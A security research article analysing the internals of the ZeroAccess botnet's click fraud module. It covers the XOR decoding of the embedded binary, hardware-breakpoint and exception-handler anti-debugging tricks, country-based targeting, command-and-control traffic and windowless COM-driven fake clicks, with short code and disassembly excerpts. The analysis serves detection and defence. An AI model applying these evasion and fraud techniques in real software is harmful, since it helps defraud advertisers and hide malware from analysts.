Abstract
Click fraud has been one of the biggest concerns for online advertisers for many years, and as researchers invest effort into developing pattern recognition and detection mechanisms to identify the fraudulent patterns, so the attackers tweak and evolve their click fraud methodologies. Wayne Low takes a look at the internal workings of the click fraud module of ZeroAccess.

Automated systems for clicking on advertisements that are displayed online for monetary gain – essentially, click fraud – has been one of the biggest concerns for online advertisers for many years. The major advertising networks, such as Google’s AdWords/AdSense, put significant effort into developing pattern recognition and detection mechanisms to identify the click patterns typically used by spammers and/or botnets engaging in click fraud.
To avoid being detected by such mechanisms, the methodology for click fraud used by botnets such as ZeroAccess (also known as clickbots) has been evolving steadily. While there are plenty of comprehensive analyses of ZeroAccess (e.g. [1]), there has been no detailed elaboration of how the ZeroAccess clickbot works internally – looking at its actions on the client machine and how it performs the click fraud operation.
The purpose of this article is to dissect the internal workings of ZeroAccess’s click fraud module and to highlight the following details of the botnet’s click fraud implementation:
How it uses a ‘traditional’ method to initialize socket functions for overlapped I/O operations, which allows simultaneous connections that can also serve as an anti debugging feature.
How it only targets specific countries, most likely because it is targeting country- or region-specific advertising networks.
How it includes functionality to randomize the clicks performed, preventing an unnaturally regular pattern that could alert suspicion from advertisers or the advertising networks.
How it uses a window-less browser to mimic legitimate clicks, making it appear as though the fraudulent clicks came from real users.
Note: The analysis that follows uses a click fraud sample (sha1: 223b257f1e810bf106819c0ec33387712a56e175) that was downloaded from the botnet in January 2013 and differs from samples examined in previous ZeroAccess-related papers. As such, some details mentioned here, such as the TCP port, will vary from previous reports.

Clickbot loader routine
The ZeroAccess malware can arrive on a client machine via many different routes, but it does so most commonly through a dropper that includes the malware as part of its payload. Once the dropper has successfully infected the machine, it downloads additional plug-in files – including the click fraud module, which has the file extension ‘@’.
This module acts as a loader for the click fraud binary, which is embedded immediately before the memcpy function. The binary is compressed as a Microsoft Cabinet file and encoded using a simple rotate left XOR algorithm with the key 0x12345678:
key = 0x12345678u;
do{
*(DWORD*)szClickfraudCode ^= key;
key = key << 1;
szClickfraudCode = (char *)szClickfraudCode + 4;
--dwClickFraudCodeSize;
}while ( dwClickFraudCodeSize );

After the decoding operation, the binary will be decompressed using Cabinet API functions. The result of the decompression consists of a single binary file named noreloc.cod.
Noreloc.cod consists of a shellcode and an embedded DLL file (see Figure 1). This binary file will be injected into the svchost.exe process job created by the plug-in module.
Figure 1. Decompressed embedded DLL module with shellcode.
(Click here to view a larger version of Figure 1.)
In older ZeroAccess variants, the shellcode was only found in the malware dropper. In more recent variants, similar shellcode can also be found in the click fraud module. Whatever the location, in general, it serves two purposes:
Deploying an anti-debugging feature
Loading an embedded MZ PE executable file.
The shellcode will register a vectored exception handler (VEH) using RtlAddVectoredExceptionHandler. An exception must be triggered to invoke this exception handler. In order to achieve this, the shellcode sets a hardware breakpoint at debug register Dr3 through a context structure. This context is then set to the thread using ZwSetContextThread.
The purpose of VEH is to intercept ZwMapViewOfSection in order to impersonate a legitimate process running malicious code (see Listing 1).

.text:0100399D    mov  edi, eax

Listing 1: Code that intercepts ZwMapViewOfSection.
LdrLoadDll has a function prototype as follows:
NTSTATUS NTAPI LdrLoadDll(
IN PWSTR DllPath OPTIONAL,
IN PULONG DllCharacteristics OPTIONAL,
IN PUNICODE_STRING DllName,
OUT PVOID *DllHandle
);

When the shellcode executes the function LdrLoadDll with ‘smss.exe’ (Session Manager Subsystem) as the DllName, the hardware breakpoint on ZwMapViewOfSection will be hit. The reason the breakpoint is hit can be seen in the following call stack:
0007cc08 7c91c3da 0000006c ffffffff 0007cce0 ntdll!ZwMapViewOfSection

If there is a debugger present and it handles the exception, no VEH will be triggered – ZwMapViewOfSection will continue execution and eventually, LdrLoadDll will return the original value of smss.exe in DllHandle. If a debugger is present, VEH will take over ZwMapViewOfSection’s execution flow and return the attacker’s desired DllHandle value to shellcode. This value holds the click fraud code and will be executed at the end of the shellcode.
After the shellcode has accomplished its task, it will load and pass execution control to smss.exe, as shown in a process environment block (PEB) of svchost.exe (Listing 2).

Listing 2: Smss.exe loaded in svchost.exe by shellcode.
The PEB result shows that the malware has successfully disguised the Session Manager Subsystem running the click fraud code; indeed the PEB output raises the following questions:
Why is a process address space allowed to contain two executable images?
Shouldn’t only one instance of smss.exe be running as an independent process?
On the other hand, these occurrences could be used as indicators that the machine has been infected.

Yet another hardware breakpoint anti-debugging routine
Once the click fraud routine has gained execution control, we immediately see another anti-debugging routine similar to the previous one; this routine, however, is slightly more straightforward. Again, it sets a hardware breakpoint at debug register Dr3, pointing to the WSPStartup function address (see Listing 3).

Listing 3: Code that sets up second anti-debugging hook.
Upon calling WSASocketW, a breakpoint exception will be triggered due to the previously set hardware breakpoint. If there is no debugger attached, the malware has the chance to handle the exception and execute its assigned code. Otherwise, the debugger will stop the program execution at the WSPStartup function, as shown in Figure 2. (Figure 2 also shows the call stack for WSASocketW.)
Figure 2. Call stack for WSASocket.
The intention of the exception handler is to initialize Windows socket callback functions. These callback functions are responsible for pre-processing the network data (for example, the data sent to the C&C server) and post-processing the data received from the server.

What is ‘z00clicker3’?
ZeroAccess’s clickbot is a multi-threaded DLL module that performs monetizing clicks. The main thread holds the major codes that generate huge numbers of clicks at regular intervals. It includes the following functionalities:
Determines whether the clients originate from specific geographic locations
Retrieves click fraud URLs from the C&C server
Executes click fraud based on the URLs retrieved from the C&C server
Sends click results to another remote server.
In order to carry out its click fraud routine effectively, the module registers a class named ‘z00clicker3’, which acts as a core function in the whole click fraud operation. The main thread interacts closely with z00clicker by sending messages to it. For instance, when the main thread successfully receives ad URLs from the C&C server, it sends a message to tell z00clicker to carry out the click fraud routine. The main thread is run in a loop that will be terminated under certain conditions.

Blocking client access by regions
One of the routines found in the main thread indicates that z00clicker only targets certain countries and is capable of locating a victim’s geographic location. The initial country code and time stamp of the malware’s installation date are stored by another plug in DLL, [email protected], in the Extended Attribute (EA) of z00clicker’s root directory:
\\.\globalroot\systemroot\Installer\{5e0dd525-1703-4a82-4e5e-73ea03452de4}\U
The country code is retrieved from a third-party GeoIP location service provider every time the thread is executed. If the installation date is older than one day, the country code will be renewed. The renewal country code and current date will be saved to the EA of the U directory again.
After the country code is determined, it is compared against the predefined string ‘USGBAUCADEINESFRITSGMYNLSE’, which appears to be a list of country codes. The click fraud operations appear to be targeting online advertising networks that are highly specific to these countries.

Table 1. Country codes.
The predefined string also indicates that IP addresses from those countries are permitted to contact the C&C server. If it is determined that the victim’s system resides in a country outside of this list, the main thread will be aborted and no click fraud operation will be carried out.
In fact, it appears that even if researchers manage to forge the country code by using proxy servers, the main thread will not perform its click fraud operation as the C&C server refuses to respond to any queries sent from the client. Clearly, the remote server has another layer of integrity checking to ensure that only actual infected clients in the targeted countries can perform the click fraud operation.

Communicating with the C&C server
Assuming the request from the victim machine is accepted, the response from the C&C server consists of URLs needed to perform the click fraud. An overview of how the clickbot performs this is shown in Figure 3.
Figure 3. The click fraud operation.
Before any of this can happen, however, the click fraud module on the infected machine has to find and communicate with one of the C&C servers.

C&C server IP addresses
The C&C server’s IP addresses are encoded and stored in the third IMAGE_RESOURCE_DATA_ENTRY in the resource section of the [email protected] plug-in DLL file saved in the U directory (Figure 4). These IP addresses are decoded using a simple XOR algorithm with the key 0x2CB7F6D5.
Figure 4. Encoded C&C server IP addresses.
An IP address is chosen randomly from the pool of addresses and stored in a global variable that will be used later in the click fraud operation.

First contact with the C&C server
The first step of the click fraud operation is to send the victim system’s information, retrieved from the Windows native API ZwQuerySystemInformation, to a C&C server on TCP port 12757. Each C&C IP address obtained from the resource section is attempted until a TCP response is received from the server (see Figure 5).
Figure 5. Encoded (top) and decoded (bottom) TCP response.
After that, the data will be obfuscated using a XOR algorithm with key 0x72 before sending it to the randomly selected remote server that was previously stored in the global variable.
To avoid network latency, the main thread is suspended for a predetermined length of time specified in ZwDelayExecution. The suspended thread is resumed either when the time interval expires or when an alert is received from the ZwAlertThread API if the TCP data has been received and decoded successfully (see Listings 5 and 6).

Z00clicker's fraudulent click method
The TCP response on port 12757 is merely a raw data set that needs to be pre-processed before the actual click fraud happens.

Sorting the raw TCP data
The data consists of a set of ‘referrer’ URLs, each with at least one accompanying ad URL, for example: [referrer URL A][ad URL A.1][ad URL A.2], [referrer URL B][ad URL B.1] [ad URL B.2]. After all the URL sets have been parsed, a new array of data structure is populated in which every referrer string is associated with an ad URL.
This data structure is then sorted in descending order based on the aggregate click counter of an ad URL (at offset 0x04) (see Figure 6), which is itself the result of the multiplier value (at offset 0x08) multiplied by the click counter at offset 0x0c+strlen(Referrer string) (see Listing 7).

Listing 7: Raw data received from the C&C server and its data structure.
The first pair of referrer and ad URLs (on memory addresses 0x963694 and 0x96370d, respectively) is selected from the sorted data structure for use in the click fraud operation. This is considered a preliminary step to reduce the chances of having the clicks distributed too heavily on a particular URL – an unnatural pattern that may lead to the clicks being detected.

The referrer and ad URLs
It has been observed that the referrer URL always contains the strings ‘afdt’ and ‘search’ in its parameters. Based on our observation, the referrer appears to be the domain names owned by the botnet operator, although we have not been able to verify this as the registrant information has been protected. These domains do, however, have one thing in common: they are parked domains [2] that use very similar structures and page designs, even down to the colours used.
The ad URL contains common strings such as ‘click’, ‘click2’, ‘clid’, ‘/feed/go.php’, etc., and is a redirection URL hosted on ad redirection servers. The redirection URL starts off a chain of HTTP redirections, and usually there are three HTTP redirections before the ad server – the search engine platform operated by the advertising network – is reached.

Click fraud with a window-less browser
A ‘traditional’ fraudulent click can be implemented in many ways. The most common ones used are:
Intercepting Windows network APIs such as send, recv, WSPSend, WSPrecv, HTTPSendRequest, InternetReadFile, etc.
Installing malicious browser add-ons to hijack search results.
TDL, Redyms and Bamital are examples of malware families that perform Windows network API interception. Medfos and Simda are examples of malware that will install malicious browser extensions. However, ZeroAccess uses neither of these methods.
ZeroAccess’s click operation is carried out by the ‘z00clicker3’ callback function when it receives a message sent by the main thread (see Listing 8).
.text:10003C9A   push   ebx   ; lParam = Parsed URL set data structure after sorting
.text:10003C9B   push   1     ; wParam = Only 1 set of ads URL and referer to be sent
.text:10003C9D   push   406h  ; Msg = Send “click fraud action” message
.text:10003CA2   push   dword ptr [eax+8] ; hWnd = z00clicker3 window
.text:10003CA5   call   ds:SendMessageW

Listing 8: The main thread sends a ‘click fraud action’ message.
Upon receiving the message, z00clicker initiates an HTTP GET request using a random fake host name (which always contains the ‘.cm’ TLD, which was retrieved from the first TCP connection). The GET query is a Base64-encoded string generated by first running the ad redirection URL through a XOR algorithm (without the HTTP protocol prefix, with key 0x69) and then encoding the result using the algorithm. The GET request is sent through the Windows socket API, together with a fake host name, to the C&C server address instead of sending the request to the non existent host name. The C&C server replies with an HTTP 303 [3] response that contains the same ad redirection URL in the Location HTTP header field.
Figure 7. HTTP response 303.
The URL in the HTTP Location header field indicates the botnet’s ad redirection server address. A separate GET request needs to be sent by the clickbot, which results in a series of HTTP 301/302 redirections that will reach the ad server.
An interesting thing found in z00clicker is its ability to mimic the way users interact with the ad server. It is able to do so without using Internet web browsers, which makes it unusual among clickbots. This is implemented with the following steps:
A COM object instance of IHTMLDocument2 is created using CoCreateInstance.
A URL moniker is created from the ad URL using CreateURLMonikerEx.
A bind context object named ‘__DWNBINDINFO’ is registered using ole32!CBindCtx::RegisterObjectParam. An important parameter in this function is a pointer to a data structure with various defined fields, most crucially the callback functions pointer. These callback functions ensure the attacker’s desired referrer string is set in the HTTP header before the ad redirection URL is loaded. Once the click has completed, it reports the result of which ad redirection URL has been clicked to another server on UDP port 123.
The ad redirection URL is loaded via the IPersistMoniker::Load() function. Using this COM method, the clickbot is able to emulate user interaction with the websites by using a combination of three or four HTTP redirections.
After the ad redirection URL is loaded, the ad redirection server will be contacted, followed by multiple HTTP redirections to reach the ad control server. The ad control server determines which destination ad server the traffic will be forwarded to. The random search query specified in the referrer string will be processed from the ad server.
A simplified overview of the redirections and servers involved in this process can be seen in Figure 8.

Conclusion
ZeroAccess has undoubtedly introduced a lot of innovative ways of achieving its goals, so a dissection of the click fraud module provides an interesting insight into how it differs from other ‘traditional’ clickbots. Highlights of the analysis include the country-specific targeting of the ZeroAccess click fraud, and the methods it uses to perform its fraudulent clicks without triggering the detection mechanisms used by search engines and online advertisers.
One of the remaining challenges in analysing the click fraud module involves circumventing the regional check implemented by the clickbot on both the client and the server’s side. Without more in depth knowledge of how the client interacts with the server, researchers – and the online advertising networks – are hampered in recognizing and developing detection algorithms to identify the click fraud generated by ZeroAccess.
